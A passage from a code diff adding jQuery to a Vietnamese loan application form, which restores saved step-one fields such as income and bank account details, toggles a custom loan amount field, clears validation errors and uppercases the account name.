+            if (step1Data.loanTerm) $('#loanTerm').val(step1Data.loanTerm);
+            if (step1Data.purpose) $('#purpose').val(step1Data.purpose);
+            if (step1Data.monthlyIncome) $('#monthlyIncome').val(parseInt(step1Data.monthlyIncome).toLocaleString('vi-VN'));
+            if (step1Data.bankName) $('#bankName').val(step1Data.bankName);
+            if (step1Data.accountNumber) $('#accountNumber').val(step1Data.accountNumber);
+            if (step1Data.accountName) $('#accountName').val(step1Data.accountName);
+
+            // 5. Lắng nghe sự kiện "Khác" cho loan amount
+            $('#loanAmount').on('change', function() {
+                if ($(this).val() === 'other') {
+                    $('#customLoanAmountGroup').slideDown();
+                    $('#customLoanAmount').prop('required', true);
+                } else {
+                    $('#customLoanAmountGroup').slideUp();
+                    $('#customLoanAmount').prop('required', false).removeClass('is-invalid');
+                }
+            });
+
+            // 6. Remove error on input
+            $('input, select').on('input change', function() {
+                $(this).removeClass('is-invalid');
+            });
+
+            // 7. Auto uppercase account name
+            $('#accountName').on('input', function() {
+                this.value = this.value.toUpperCase();
+            });
+        });
     </script>
 </body>
 </html>
